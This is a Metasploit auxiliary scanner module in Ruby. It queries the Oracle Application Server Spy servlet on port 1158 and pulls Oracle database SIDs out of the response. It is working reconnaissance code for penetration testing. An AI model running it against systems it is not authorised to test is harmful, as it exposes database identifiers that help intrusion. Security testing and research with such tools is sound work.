##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'Oracle Application Server Spy Servlet SID Enumeration',
      'Description' => %q{
          This module makes a request to the Oracle Application Server
        in an attempt to discover the SID.
      },
      'References'  =>
        [
          [ 'URL', 'http://dsecrg.com/files/pub/pdf/Different_ways_to_guess_Oracle_database_SID_(eng).pdf' ],
        ],
      'Author'      => [ 'MC' ],
      'License'     => MSF_LICENSE
    )

    register_options(
      [
        Opt::RPORT(1158)
      ])
  end

  def run_host(ip)
    begin
      res = send_request_raw({
        'uri'     => '/servlet/Spy?format=raw&loginfo=true',
        'method'  => 'GET',
        'version' => '1.1',
      }, 5)

      if res and res.body =~ /SERVICE_NAME=/
        select(nil,nil,nil,2)
        sid = res.body.scan(/SERVICE_NAME=([^\)]+)/)
          report_note(
              :host	=> ip,
              :port	=> datastore['RPORT'],
              :proto	=> 'tcp',
              :type	=> 'oracle_sid',
              :data	=> { :sid => sid.uniq.to_s },
              :update	=> :unique_data
          )
        print_good("#{rhost}:#{rport} Discovered SID: '#{sid.uniq}'")
      else
        print_error("Unable to retrieve SID for #{ip}...")
      end
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
    rescue ::Timeout::Error, ::Errno::EPIPE
    end
  end
end
